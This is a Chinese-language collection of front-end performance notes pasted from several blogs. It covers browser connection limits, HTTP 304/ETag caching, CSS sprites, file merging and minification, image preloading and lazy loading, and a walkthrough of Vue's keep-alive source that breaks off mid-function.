不知是因为设计理念上的不同，还是因为beta版未照顾到这一块，Firefox4反而退化了，和Firefox3.6的区别主要体现在对资源类型的处理上，Firefox4不再严格地优先下载script和link标签定义的外部资源，而是按照HTML结构中出现的顺序来进行加载。

Chrome8
 
Chrome自带的工具不能很清楚地表示各请求的开始时间，所以使用了Fiddler的瀑布图，从图上可以看出，Chrome也是比较特立独行的一位，其特点有：

最大并发HTTP连接数为6。
head部分的资源会单独下载，且阻塞body中的其他资源的加载。
会优先加载script和link标签定义的资源。
Opera11
 
先报怨一下，Dragonfly不怎么好用来着……Opera的资源加载也比较有特色，而且很难看出规律，只能大致总结一下：

Opera的最大并发HTTP连接数默认为16，可在opera:config - Performance - Max Connections Server查看和修改。
javascript文件的加载会阻塞其他script和link标签定义的外部资源的加载，如图中的2.js。但不会阻塞图片等其他资源的加载，如图中的3.js。
会一定程度上对资源的优先级进行优化，但由于javascript文件要阻止后续部分资源的加载，又为了充分利用最大HTTP连接数，因此不能严格先加载所有的script和link标签定义的资源，导致瀑布图上各类型资源有相互穿插，难寻规律。
这还是在比较乐观的情况下，有几秒加载完毕的，按道理来说，图片都不大，应该都在1秒范围内就才是在接收范围内。当然和用户自身的带宽也有关系，但是从我的观察来看，是分批加载的。

于是乎我查看资料，发现。

从Yahoo关于网站优化的经典14条建议，在V2版中，已经更新到35条了，其中有需要减少请求连接数和减少DNS解析次数，由于在http协议中有对浏览器并发请求连接数的限制，1.1版本中规定了是2个（相关资料可以查看文章的结尾），于是通常的优化网站加载速度的方法是采用多个域名增加浏览器对同一网页的请求并发连接数。

二、下面我来看看各大电商是怎么处理的。
1.京东（www.jd.com）
    京东图片域名一直是老域名360buyimg.com。

    http://img13.360buyimg.com/da/jfs/t1879/131/2924301202/126044/7c7cbf5c/56f3b58fN37c1340a.jpg

    比如说这张图片，你可以复制打开这个链接，把前面的二级域名的Img13换成img11、img12、img13等，发现都是可以打开的，而且一般是同一IP，有的同学说换成img8、img1、img2等打不开，这个是策略问题。这只是举个栗子。

2.天猫（www.tmall.com）
    图片CDN域名有很多，tbcdn.cn、alicdn.com 等

    也是同理，不过最近HTTPS转变后都换成img.alicdn.com了。原因不明。

三、说一下Firefox浏览器
在Firefox地址栏中输入：about:config

在搜索项输入：network.http.max-connections

老版本值是30，我这个版本是256，说明有改进。



我们再输入：network.http.max-persistent-connections-per-server进行搜索，发现是6。



你可以写个Demo测试一下，写个小循环，然后访问同一个域名（推荐用 Ajax  方式），然后后台sleep一会，你就能看出效果。之前有人做过低版本的测试，得出结论。

IE8的并发连接数限制为10；

Firefox    和 chrome  的并发连接数都为6，可能各个版本有区别。作为一个站长，或者说一个完善的产品，这个是不得不考虑的。

解决方案：

1.给定一组域名，如：img1.baidu.com、img2.baidu.com、img3.baidu.com、img4.baidu.com... ... 

2.这组域名指向同一个源，或者说最终源是一个。

3.上传图片（静态文件）的时候随机返回这组域名中的其中一个即可，这样图片的访问域名就不会出现只是一个域名了。
```

### 静态资源缓存 304 （If-Modified-Since 以及 Etag 原理）
```
https://blog.csdn.net/lihongjun_0204/article/details/84096679
今天在用chrome浏览淘宝页面的时候，发现很多来自淘宝图片HTTP状态码是 304 Not Modified

到百度搜索了一下，明白了 304状态的含义（以下绿色内容来自网络）：

304 Not Modified：客户端有缓冲的文件并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。

如果客户端在请求一个文件的时候，发现自己缓存的文件有 Last Modified ，那么在请求中会包含 If Modified Since ，这个时间就是缓存文件的 Last Modified 。因此，如果请求中包含 If Modified Since，就说明已经有缓存在客户端。只要判断这个时间和当前请求的文件的修改时间就可以确定是返回 304 还是 200 。对于静态文件，例如：CSS、图片，服务器会自动完成 Last Modified 和 If Modified Since 的比较，完成缓存或者更新。但是对于动态页面，就是动态产生的页面，往往没有包含 Last Modified 信息，这样浏览器、网关等都不会做缓存，也就是在每次请求的时候都完成一个 200 的请求。

我突然想起我所写的图片服务器没有实现HTTP 304 缓存功能。

这个 304 状态一般主要在用户刷新页面(F5键)的时候触发.
[b]当用户在刷新页面的时候，因为原来的页面里的很多图片已经缓存过，客户端的浏览器已经记录了图片的最后更新时间(Last Mod)，所以在用户刷新页面的时候，会向服务器提交一个字段：If-Modified-Since: Wed, 08 Sep 2010 21:35:06 GMT
[/b]

这个时候，服务器端的程序先取得这个字段的值，然后与服务器上的图片最后修改时间对比，如果相同，就直接返回 304 Not Modified ，然后停止。这样就不用把图片重新传输到客户端，达到节省带宽的目的。

关于 Cache-Control: max-age=秒 和 Expires

Expires = 时间，HTTP 1.0 版本，缓存的载止时间，允许客户端在这个时间之前不去检查（发请求）
max-age = 秒，HTTP 1.1版本，资源在本地缓存多少秒。
如果max-age和同时存在，则被Cache-Control的max-age覆盖。

Expires 的一个缺点就是，返回的到期时间是服务器端的时间，这样存在一个问题，如果客户端的时间与服务器的时间相差很大，那么误差就很大，所以在HTTP 1.1版开始，使用Cache-Control: max-age=秒替代。

今天我还发现一个小的问题，是关于客户端的日期格式：

Wed, 08 Sep 2010 21:35:06 GMT 与 Wed, 8 Sep 2010 21:35:06 GMT

注意上面的格式，一个是8的前面有个前置的0，一个没有。

我发现firefox和chrome对这个日期格式处理一致，ie有点不同。
最终我修改了服务器端的程序：
//HTTP 日期格式: Wed, 08 Sep 2010 21:35:06 GMT
DateFormat dateFormatGMT = new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z", Locale.ENGLISH); //时间格式
https://blog.csdn.net/weixin_43915587/article/details/95499873
状态码304
相关头信息

Last-Modified：响应头，表示当前资源的最后修改时间；
If-Modified-Since：请求头，表示缓存的资源最后修改时间；
状态码304：表示访问的资源没有改变

客户端首次访问服务器的静态资源index.html，服务器会把index.html响应给客户端，而且还会添加一个名为Last-Modified的响应头，它说明了当前index.html的最后修改时间
客户端收到响应后，会把index.html缓存在客户端上，而且还会把Last-Modified缓存起来。
客户端第二次请求index.html时，会添加名为If-Modified-Since的请求头，它的值是上次服务器响应头Last-Modified，服务器获取到客户端保存的最后修改时间，以及当前资源的最后修改时间进行比较，如果相同，说明index.html没有改动过，那么服务器不会发送index.html，而是响应状态码304，即通知客户端资源没有改变，你可以使用自己的缓存。
ETag 是 Entity Tag（实体标签）的缩写
在HTTP1.1协议中其实就是请求HEAD中的一个属性

HTTP/1.1 200 OK
Date: Mon, 23 May 2005 22:38:34 GMT
Content-Type: text/html; charset=UTF-8
Content-Encoding: UTF-8
Content-Length: 138
Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
Server: Apache/1.3.3.7 (Unix) (Red-Hat/Linux)
ETag: "3f80f-1b6-3e1cb03b"
Accept-Ranges: bytes
Connection: close
1
2
3
4
5
6
7
8
9
10
ETag是HTTP1.1中才加入的一个属性，用来帮助服务器控制Web端的缓存验证。

它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag 返回给浏览器，浏览器把"3f80f-1b6-3e1cb03b" 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b” 的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。

这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。

通常情况下，ETag更类似于资源指纹(fingerprints)，如果资源发生变化了就会生成一个新的指纹，这样可以快速的比较资源的变化。在服务器端实现中，很多情况下并不会用哈希来计算ETag，这会严重浪费服务器端资源，很多网站默认是禁用ETag的。有些情况下，可以把ETag退化，比如通过资源的版本或者修改时间来生成ETag。

如果通过资源修改时间来生成ETag，那么效果和HTTP协议里面的另外一个控制属性(Last-Modified)就雷同了，使用 Last-Modified 的问题在于它的精度在秒(s)的级别，比较适合不太敏感的静态资源。
```
### 多个小图标合并使用 position 定位技术 减少请求
```
https://blog.csdn.net/ldl_xz/article/details/84804133
关于css实现面包屑已经是一个典型例子了。不过今天还是与大家分享一下实现的原理。 原理：每一段元素固定宽度并向左浮动，头尾突出部分相对父元素用相对定位固定位置，默认为同一颜色，高亮设置指定样式。

详解见下图：

enter image description here

<!--more-->
合并小图标，减少链接请求数量

enter image description here

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>面包屑</title>
    <style>
        *{margin: 0px;padding: 0px;}
        ul,ol,li,dl,dt,dd{list-style: none;}
        .iCls{*zoom:1;}
        .iCls:after{display:block; overflow:hidden;clear:both; height:0;visibility:hidden; content:".";}
        .iBread li i,.iBread li em,.iBread li strong{
            background-image:url("http://images.cnblogs.com/cnblogs_com/kuikui/354173/o_ibread.png");
            background-repeat: none;
        }
 
        .iBread{
            width: 910px;
            margin: 20px auto;
            _overflow: hidden; 
        }
 
        .iBread ul{
            border-radius: 6px;
            overflow: hidden;
        } 
 
        .iBread li{
            position: relative;
            float: left;
            width: 292px;
            height: 35px;
            line-height: 35px;
            color: #666666;
            font-weight: bold;
            background: #dfdfdf;
            margin-right: 17px;
            _margin-right: 16px;
            text-indent: 80px;
 
        }
 
        .iBread li.last{
            margin-right: 0px;
        }
 
        .iBread li i{
            position: absolute;
            right: -17px;
            top: 0px;
            z-index: 1;
            display: block;
            width: 17px;
            height: 35px;
            overflow: hidden;
            background-position: -204px 0px;
        }
 
        .iBread li em{
            display: none;
        }
 
        .iBread li strong{
            position: absolute;
            left: 30px;
            top: 3px;
            display: block;
            width: 30px;
            height: 30px;
            overflow: hidden;
            text-indent: -9999px;
            margin-right: 20px;
        }
 
        .iBread li strong.one{
            background-position: 0px 0px;
        }
 
        .iBread li strong.two{
            background-position: -34px 0px;
        }
 
        .iBread li strong.three{
            background-position: -67px 0px;
        }
 
        .iBread li strong.four{
            background-position: -101px 0px;
        }
 
        .iBread li strong.five{
            background-position: -134px 0px;
        }
 
        .iBread li.on{
            z-index: 1;
            color: #fff;
            background-image:url("http://images.cnblogs.com/cnblogs_com/kuikui/354173/o_ibread.png");
            background-repeat: repeat;
            background-position: 0px -78px;
        }
 
        .iBread li.on i{
            right: -19px;
            width: 19px;
            color: #fff;
            background-position: -228px -41px;
        }
 
        .iBread li.on em,.iBread li.lastOn em{
            position: absolute;
            left: -17px;
            top: 0px;
            z-index: 1;
            display: block;
            width: 17px;
            height: 35px;
            overflow: hidden;
            background-position: -204px -41px;
        }
 
        .iBread li.on strong.one{
            background-position: 0px -41px;
        }
 
        .iBread li.on strong.two{
            background-position: -34px -41px;
        }
 
        .iBread li.on strong.three{
            background-position: -67px -41px;
        }
 
        .iBread li.on strong.four{
            background-position: -101px -41px;
        }
 
        .iBread li.on strong.five{
            background-position: -134px -41px;
        }
 
        .iBread li.last i{
            background-position: -228px 0px;
 
        }
 
        .iBreadFour li{
            width: 214.75px;
        }
 
        .iBreadFive li{
            width: 168.4px;
        }
    </style>
</head>
<body>
    <div class="iBread">
        <ul class="iCls">
            <li class="on">
                <strong class="one">1</strong>
                第一项
                <i></i>
            </li>
            <li>
                <strong class="two">2</strong>
                第二项
                <i></i><em></em>
            </li>
            <li class="last">
                <strong class="three">3</strong>
                第三项
                <em></em>
            </li>
        </ul>
    </div>
 
    <div class="iBread iBreadFour">
        <ul class="iCls">
            <li class="on">
                <strong class="one">1</strong>
                第一项
                <i></i>
            </li>
            <li>
                <strong class="two">2</strong>
                第二项
                <i></i><em></em>
            </li>
            <li >
                <strong class="three">3</strong>
                第三项
                <i></i><em></em>
            </li>
            <li class="last">
                <strong class="four">4</strong>
                第四项
                <em></em>
            </li>
        </ul>
    </div>
 
    <div class="iBread iBreadFive">
        <ul class="iCls">
            <li >
                <strong class="one">1</strong>
                第一项
                <i></i>
            </li>
            <li class="on" >
                <strong class="two">2</strong>
                第二项
                <i></i><em></em>
            </li>
            <li >
                <strong class="three">3</strong>
                第三项
                <i></i><em></em>
            </li>
            <li>
                <strong class="four">4</strong>
                第四项
                <i></i><em></em>
            </li>
            <li class="last">
                <strong class="five">5</strong>
                第五项
                <em></em>
            </li>
        </ul>
    </div>
</body>
</html>

转载自:http://www.9958.pw/post/mianbaoxie_css
```
### 静态资源合为单次请求 并压缩
```
https://www.cnblogs.com/LO-ME/p/7523596.html
资源合并与压缩减少HTTP请求的概要

资源合并与压缩减少HTTP请求主要的两个优化点是减少HTTP请求的数量和减少请求资源的大小

http协议是无状态的应用层协议，意味着每次http请求都需要建立通信链路、进行数据传输，而在服务器端，每个http都需要启动独立的线程去处理。

这些通信和服务的开销都很昂贵，减少http请求的数量和减少请求资源的大小可有效提高访问性能

减少http的主要手段是合并CSS、合并JavaScript、合并图片。将浏览器一次访问需要的javascript和CSS合并成一个文件，这样浏览器就只需要一次请求。

图片也可以合并，多张图片合并成一张，如果每张图片都有不同的超链接，可通过CSS偏移响应鼠标点击操作，构造不同的URL。将图片base64，这样也可以减少请求

 

 

HTML压缩

首先我们来看一下新浪的首页是没有进行html压缩的有空格换行等等



再来看看百度首页是有做html压缩的



HTML代码压缩就是压缩这些文件在文本文件中有意义，但是html中不显示的字符，包括空格，制表符，换行符等，还有一些其他意义的字符，比如HTML注释也可以被压缩

在编写代码的过程中空格，换行这些是很有意义的，可以比较容易看懂，但是浏览器不会在乎这些

HTML代码压缩的方法有如下几种：使用在线网站进行压缩，  同构构建工具比如（fis3，webpack）自动压缩，nodejs提供了html-minifier工具，后端模板引擎渲染压缩

 

 

CSS压缩

下面首先来看一下百度首页的css压缩代码，去掉了回车和空格，还做了无效代码删除（注释，无效的字符），css语义合并



CSS代码压缩的方法有如下几种：使用在线网站进行压缩，  同构构建工具比如（fis3，webpack）自动压缩，nodejs提供了html-minifier工具对html中的css进行压缩，使用clean-css对css进行压缩

 

 

 

JS的压缩和混乱

首先来看一下百度首页对js的压缩，主要对js做以下四件事情：无效字符的删除（空格，回车），剔除注释，代码语义的缩减和优化（将一些变量的长度进行缩短等），代码保护（js代码是可以在客户端看到的，将js代码混乱后就变的不容易看懂，对代码进行了一定的保护作用）



JS代码压缩的方法有如下几种：使用在线网站进行压缩， nodejs提供了html-minifier工具对html中的js进行压缩，使用uglifyjs2对js进行压缩

 

 

 

文件合并

左边是不合并请求，右边是合并请求

不合并请求存在的问题：文件与文件之间有插入的上行请求，增加了N-1个网络延迟，受丢包问题影响更严重，经过代理服务器时可能会被断开

合并请求存在的问题

首屏渲染的问题（文件合并之后生成的那个文件比较大，请求时间会比较长，就会导致首屏渲染比较慢的问题（vue，react等单页面应用框架））

缓存失效问题（js文件是有缓存的，在标记这个js是否有改变是通过js后面加上一个MD5戳，唯一表示这个js文件改变，如果a.js，b.js,.....任何一个文件改变都会导致合并后的js文件改变，这样缓存的js就无效了，当只是a.js改变本来只是a.js的缓存失效，而不会大面积的js缓存失效，这就是缓存失效的问题）



那么在合并js文件的时候需要注意的是：

对公共库的js代码进行合并（公共库改变大部分情况下是不会改的），将业务代码单独打包成一个文件，或者不进行合并（因为改动会比较大比较频繁），这样改变了业务代码不会影响公共库的js的缓存

不同页面的合并，

 

 

 

开启HTTP的gzip压缩

查看前端性能优化成神之路-HTTP压缩开启gzip这篇文章 

 

 

图片压缩

查看：前端性能优化成神之路—图片相关的优化

 
```
### CDN
```
```

### 静态资源延迟加载技术、预加载技术
```
https://www.cnblogs.com/leyan/p/6085148.html
 js中加载分两种：预加载与延迟加载

  一、  预加载，增强用户的体验，但会加载服务器的负担。一般会使用多种 CSS(background)、JS(Image)、HTML(<img />) 。

        1、什么是预加载

             提前加载图片，当用户需要查看时可直接从本地缓存中渲染

        2、实现预加载的方法

              a、单纯的css 实现

                   可通过CSS的background属性将图片预加载到屏幕外的背景上。只要这些图片的路径保持不变，当它们在Web页面的其他地方被调用时，浏览器就会在渲染过程中使用预加载（缓存）的图片。简单、高效，不需要任何JavaScript。

             

#preload-01 { background: url(http://domain.tld/image-01.png) no-repeat -9999px -9999px; } 
              b、单纯的js预加载图片

                 

复制代码
<div class="hidden">  
    <script type="text/javascript">  
        <!--//--><![CDATA[//><!--  
            var images = new Array()  
            function preload() {  
                for (i = 0; i < preload.arguments.length; i++) {  
                    images[i] = new Image()  
                    images[i].src = preload.arguments[i]  
                }  
            }  
            preload(  
                "http://domain.tld/gallery/image-001.jpg",  
                "http://domain.tld/gallery/image-002.jpg",  
                "http://domain.tld/gallery/image-003.jpg"  
            )  
        //--><!]]>  
    </script>  
</div>
复制代码
 

           c、使用ajax实现预加载

            

复制代码
window.onload = function() {  
    setTimeout(function() {  
        // XHR to request a JS and a CSS  
        var xhr = new XMLHttpRequest();  
        xhr.open('GET', 'http://domain.tld/preload.js');  
        xhr.send('');  
        xhr = new XMLHttpRequest();  
        xhr.open('GET', 'http://domain.tld/preload.css');  
        xhr.send('');  
        // preload image  
        new Image().src = "http://domain.tld/preload.png";  
    }, 1000);  
};
复制代码
参考网址：http://web.jobbole.com/86785/

 

　　二、延迟加载（懒加载）

          1、什么是懒加载

               懒加载又称延迟加载。

               当访问一个页面时，先把img元素或者其他元素的背景图片替换成一张大小1*1px图片的路径（只需要请求一次的占位图），只有当图片出现在浏览器的可视区域内时，才设置图片真正的路径，让图片显示出来，这就是图片的懒加载。

          2、懒加载的实现原理

                页面中img元素，如果没有src属性，浏览器就不会发出请求去下载图片，只有通过js设置图片路径，浏览器才会发送请求；

                懒加载的原理是先在页面中把所有的图片统一使用一张占位图进行占位，把真正的路径存在元素的‘data-url’属性中，要使用的时候，在设置。

         3、懒加载的实现步骤

              1)首先，不要将图片地址放到src属性中，而是放到其它属性(data-original)中。
              2)页面加载完成后，根据scrollTop判断图片是否在用户的视野内，如果在，则将data-original属性中的值取出存放到src属性中。
              3)在滚动事件中重复判断图片是否进入视野，如果进入，则将data-original属性中的值取出存放到src属性中。

         4、懒加载的优点

              页面加载速度快、可以减轻服务器的压力、节约了流量,用户体验好

 

           三、懒加载与预加载的对比

               1、概念

                   懒加载也叫延迟加载：js图片延迟加载，延迟加载图片或者符合某些条件是才加载某些图片；

                   预加载：提前加载图片，当用户需要查看时可直接从本地缓存中渲染。（base64小图片可以通过css保存）

                2、区别

                  两种技术的本质：两者的行为相反，一个是提前加载，一个是迟缓甚至不加载。懒加载会对前端有一定的缓解压力作用，预加载则会增加前端的压力。

                3、懒加载的意义及实现方式：

                     懒加载的主要目的是优化前端性能，减少请求数或延迟请求数。

                    方法：

                       a、纯粹的延迟加载，使用setTimeOut或者setInterval 进行加载延迟；

                       b、条件加载，符合某些条件，或者触发了某些事件才开始异步下载；

                       c、可视区加载，即仅加载可以看到的区域，监控滚动条实现。

                4、预加载的意义及实现方式

                     预加载是牺牲前端性能，换取用户体验，使用户的操作得到最快的反映。

                    方法：

                   比如：用CSS和JavaScript实现预加载；仅使用JavaScript实现预加载；使用Ajax实现预加载。

                  常用的是new Image();设置其src来实现预载，再使用onload()方法回调预加载完成事件。只要浏览器吧图片下载到本地，src就会使用缓存，这是最基本的预加载方法。当image下载完图片后，会得到宽和高，因此可以在预加载钱得到图片的大小(方法是用记时器轮循宽高变化)。

 

复制代码
function loadImage(url,callback) {
    var img = new Image();
    
    img.src = url;
 
    if(img.complete) {  // 如果图片已经存在于浏览器缓存，直接调用回调函数
        
        callback.call(img);
        return; // 直接返回，不用再处理onload事件
    }
 
    img.onload = function(){
        img.onload = null;
        callback.call(img);
    }
}
复制代码
 

                     参考网址：https://blog.csdn.net/YiDaShi33/article/details/54316126

 

 四、vue中的懒加载

        vue中的延迟加载是通过webpack代码拆分组件实现的。

         在vue中，有3块不同的延迟加载和代码拆分，使用动态导入：

            a、组件，又称为异步组件

            b、路由器

            c、vuex模块

     1、 vue组件的延迟加载

            通过将import函数包装到箭头函数中，Vue将仅在请求时执行它，并在该时刻加载模块。

Vue.component('AsyncCmp', () => import('./AsyncCmp'))
 

    2、vue路由器中的延迟加载

          vue路由器内置支持延迟加载。假设我们想在/login 路由中延迟加载一个Lgin 组件

复制代码
// Instead of: import Login from './login'
const Login = () => import('./login')

new VueRouter({
  routes: [
    { path: '/login', component: Login }
  ]
})
复制代码
   

   3、延迟加载vuex模块

         Vuex有一种registerModule方法可以让我们动态创建Vuex模块。

          

复制代码
const store = new Vuex.Store()

...

// Assume there is a "login" module we wanna load
import('./store/login').then(loginModule => {
  store.registerModule('login', loginModule)
})
复制代码
 

 参考网址：https://alexjoverm.github.io/2017/07/16/Lazy-load-in-Vue-using-Webpack-s-code-splitting/


```

### keep-alive
```
https://www.jianshu.com/p/9523bb439950
一、前言
本文介绍的内容包括：

keep-alive用法：动态组件&vue-router
keep-alive源码解析
keep-alive组件及其包裹组件的钩子
keep-alive组件及其包裹组件的渲染
二、keep-alive介绍与应用
2.1 keep-alive是什么
keep-alive是一个抽象组件：它自身不会渲染一个DOM元素，也不会出现在父组件链中；使用keep-alive包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。

一个场景
用户在某个列表页面选择筛选条件过滤出一份数据列表，由列表页面进入数据详情页面，再返回该列表页面，我们希望：列表页面可以保留用户的筛选（或选中）状态。
keep-alive就是用来解决这种场景。当然keep-alive不仅仅是能够保存页面/组件的状态这么简单，它还可以避免组件反复创建和渲染，有效提升系统性能。总的来说，keep-alive用于保存组件的渲染状态。

keep-alive用法
在动态组件中的应用
<keep-alive :include="whiteList" :exclude="blackList" :max="amount">
     <component :is="currentComponent"></component>
</keep-alive>
在vue-router中的应用
<keep-alive :include="whiteList" :exclude="blackList" :max="amount">
    <router-view></router-view>
</keep-alive>
include定义缓存白名单，keep-alive会缓存命中的组件；exclude定义缓存黑名单，被命中的组件将不会被缓存；max定义缓存组件上限，超出上限使用LRU的策略置换缓存数据。

内存管理的一种页面置换算法，对于在内存中但又不用的数据块（内存块）叫做LRU，操作系统会根据哪些数据属于LRU而将其移出内存而腾出空间来加载另外的数据。

三、源码剖析
keep-alive.js内部还定义了一些工具函数，我们按住不动，先看它对外暴露的对象

// src/core/components/keep-alive.js
export default {
  name: 'keep-alive',
  abstract: true, // 判断当前组件虚拟dom是否渲染成真实dom的关键
  props: {
      include: patternTypes, // 缓存白名单
      exclude: patternTypes, // 缓存黑名单
      max: [String, Number] // 缓存的组件
  },
  created() {
     this.cache = Object.create(null) // 缓存虚拟dom
     this.keys = [] // 缓存的虚拟dom的键集合
  },
  destroyed() {
    for (const key in this.cache) {
       // 删除所有的缓存
       pruneCacheEntry(this.cache, key, this.keys)
    }
  },
 mounted() {
   // 实时监听黑白名单的变动
   this.$watch('include', val => {
       pruneCache(this, name => matched(val, name))
   })
   this.$watch('exclude', val => {
       pruneCache(this, name => !matches(val, name))
   })
 },

 render() {
    // 先省略...
 }
}
可以看出，与我们定义组件的过程一样，先是设置组件名为keep-alive，其次定义了一个abstract属性，值为true。这个属性在vue的官方教程并未提及，却至关重要，后面的渲染过程会用到。props属性定义了keep-alive组件支持的全部参数。

keep-alive在它生命周期内定义了三个钩子函数：

created
初始化两个对象分别缓存VNode(虚拟DOM)和VNode对应的键集合
destroyed
删除this.cache中缓存的VNode实例。我们留意到，这不是简单地将this.cache置为null，而是遍历调用pruneCacheEntry函数删除。
// src/core/components/keep-alive.js
function pruneCacheEntry (
  cache: VNodeCache,
  key: string,
  keys: Array<string>,
  current?: VNode
) {
 const cached = cache[key]
 if (cached && (!current || cached.tag !== current.tag)) {
    cached.componentInstance.$destroyed() // 执行组件的destroy钩子函数
 }
 cache[key] = null
 remove(keys, key)
}

删除缓存的VNode还要对应组件实例的destory钩子函数

mounted
在mounted这个钩子中对include和exclude参数进行监听，然后实时地更新（删除）this.cache对象数据。pruneCache函数的核心也是去调用pruneCacheEntry
function pruneCache (keepAliveInstance: any, filter: Function) {
  const { cache, keys, _vnode } = keepAliveInstance
  for (const key in cache) {
    const cachedNode: ?VNode = cache[key]
    if (cachedNode) {
      const name: ?string = getComponentName(cachedNode.componentOptions)
      if (name && !filter(name)) {
        pruneCacheEntry(cache, key, keys, _vnode)
      }
    }
  }
}
render
render () {
  const slot = this.$slots.defalut
  const vnode: VNode = getFirstComponentChild(slot) // 找到第一个子组件对象
  const componentOptions : ?VNodeComponentOptions = vnode && vnode.componentOptions
  if (componentOptions) { // 存在组件参数
    // check pattern
    const name: ?string = getComponentName(componentOptions) // 组件名
    const { include, exclude } = this
    if (// 条件匹配
      // not included
      （include && (!name || !matches(include, name))）||
      // excluded
        (exclude && name && matches(exclude, name))
    ) {
        return vnode
    }
    
    const { cache, keys } = this
    // 定义组件的缓存key
    const key: ?string = vnode.key === null ? componentOptions.Ctor.cid + (componentOptions.tag ? `::${componentOptions.tag}` : '') : vnode.key
     if (cache[key]) { // 已经缓存过该组件
        vnode.componentInstance = cache[key].componentInstance
        remove(keys, key)
        keys.push(key) // 调整key排序
     } else {
        cache[key] = vnode //缓存组件对象
        keys.push(key)
        if (this.max && keys.length > parseInt(this.max)) {
          //超过缓存数限制，将第一个删除
          pruneCacheEntry(cahce, keys[0], keys, this._vnode)
        }
     }
     
      vnode.data.keepAlive = true //渲染和执行被包裹组件的钩子函数需要用到
 
 }
 return vnode || (slot && slot[0])
}
第一步：获取keep-alive包裹着的第一个子组件对象及其组件名；
第二步：根据设定的黑白名单（如果有）进行条件匹配，决定是否缓存。不匹配，直接返回组件实例（VNode），否则执行第三步；
第三步：根据组件ID和tag生成缓存Key，并在缓存对象中查找是否已缓存过该组件实例。如果存在，直接取出缓存值并更新该key在this.keys中的位置（更新key的位置是实现LRU置换策略的关键），否则执行第四步；
第四步：在this.cache对象中存储该组件实例并保存key值，之后检查缓存的实例数量是否超过max设置值，超过则根据LRU置换策略删除最近最久未使用的实例（即是下标为0的那个key）;
第五步：最后并且很重要，将该组件实例的keepAlive属性值设置为true。
四、重头戏：渲染
4.1 Vue的渲染过程
借助一张图看下Vue渲染的整个过程：
vue渲染过程.png

Vue的渲染是从图中render阶段开始的，但keep-alive的渲染是在patch阶段，这是构建组件树（虚拟DOM树），并将VNode转换成真正DOM节点的过程。
简单描述从render到patch的过程
我们从最简单的new Vue开始：
import App from './App.vue'

new Vue({
    render: h => h(App)
}).$mount('#app')
Vue在渲染的时候先调用原型上的_render函数将组件对象转化成一个VNode实例；而_render是通过调用createElement和createEmptyVNode两个函数进行转化；
createElement的转化过程会根据不同的情形选择new VNode或者调用createComponent函数做VNode实例化；
完成VNode实例化后，这时候Vue调用原型上的_update函数把VNode渲染成真实DOM，这个过程又是通过调用patch函数完成的（这就是patch阶段了）
用一张图表达：
渲染过程.png
4.2 keep-alive组件的渲染
我们用过keep-alive都知道，它不会生成真正的DOM节点，这是怎么做到的？

// src/core/instance/lifecycle.js
export function initLifecycle (vm: Component) {
    const options= vm.$options
    // 找到第一个非abstract父组件实例
    let parent = options.parent
    if (parent && !options.abstract) {
        while (parent.$options.abstract && parent.$parent) {
              parent = parent.$parent
        }
        parent.$children.push(vm)
    }
    vm.$parent = parent
    // ...
}
Vue在初始化生命周期的时候，为组件实例建立父子关系会根据abstract属性决定是否忽略某个组件。在keep-alive中，设置了abstract:true，那Vue就会跳过该组件实例。

最后构建的组件树中就不会包含keep-alive组件，那么由组件树渲染成的DOM树自然也不会有keep-alive相关的节点了。

keep-alive包裹的组件是如何使用缓存的？
在patch阶段，会执行createComponent函数：

// src/core/vdom/patch.js
function createComponent (vnode, insertedVnodeQueue, parentElm, refElm) {
    let i = vnode.data
    if (isDef(i)) {
        const isReactivated = isDef(vnode.componentInstance) && i.keepAlive
        if (isDef(i = i.hook) && isDef(i = i.init)) {
            i(vnode, false)
        }
        if (isDef(vnode.componentInstance)) {
            initComponent(vnode, insertedVnodeQueue)
            insert(parentElem, vnode.elem, refElem) // 将缓存的DOM(vnode.elem) 插入父元素中
            if (isTrue(isReactivated)) {
                reactivateComponent(vnode, insertedVnodeQueue, parentEle, refElm)
            }
            return true
        }
    }
}
在首次加载被包裹组建时，由keep-alive.js中的render函数可知，vnode.componentInstance的值是undfined，keepAlive的值是true，因为keep-alive组件作为父组件，它的render函数会先于被包裹组件执行；那么只执行到i(vnode,false)，后面的逻辑不执行；
再次访问被包裹组件时，vnode.componentInstance的值就是已经缓存的组件实例，那么会执行insert(parentElm, vnode.elm, refElm)逻辑，这样就直接把上一次的DOM插入到父元素中。
五、不可忽视：钩子函数
5.1 只执行一次的钩子
一般的组件，每一次加载都会有完整的生命周期，即生命周期里面对于的钩子函数都会被触发，为什么被keep-alive包裹的组件却不是呢？
被缓存的组件实例会为其设置keepAlive= true，而在初始化组件钩子函数中：

// src/core/vdom/create-component.js
const componentVNodeHooks = {
    init (vnode: VNodeWithData, hydrating: boolean): ?boolean{
        if (
         vnode.componentInstance &&       
         !vnode.componentInstance._isDestroyed &&
         vnode.data.keepAlive
        ) {
          // keep-alive components, treat as a patch
          const mountedNode:any = vnode
          componentVNodeHooks.prepatch(mountedNode, mountedNode)
        } else {
          const child = vnode.componentInstance = createComponentInstanceForVnode (vnode, activeInstance)
           
        }
    }
}
可以看出，当vnode.componentInstance和keepAlive同时为true时，不再进入$mount过程，那mounted之前的所有钩子函数（beforeCreate、created、mounted）都不再执行。

5.2 可重复的activated
在patch的阶段，最后会执行invokeInsertHook函数，而这个函数就是去调用组件实例（VNode）自身的insert钩子：

// src/core/vdom/patch.js
function invokeInsertHook (vnode, queue, initial) {
      if (isTrue(initial) && isDef(vnode.parent)) {
          vnode.parent.data,pendingInsert = queue
      } else {
         for(let i =0; i<queue.length; ++i) {
                queue[i].data.hook.insert(queue[i]) // 调用VNode自身的insert钩子函数
         }
      }
}
再看insert钩子：

const componentVNodeHooks = {
      // init()
     insert (vnode: MountedComponentVNode) {
           const { context, componentInstance } = vnode
           if (!componentInstance._isMounted) {
                 componentInstance._isMounted = true
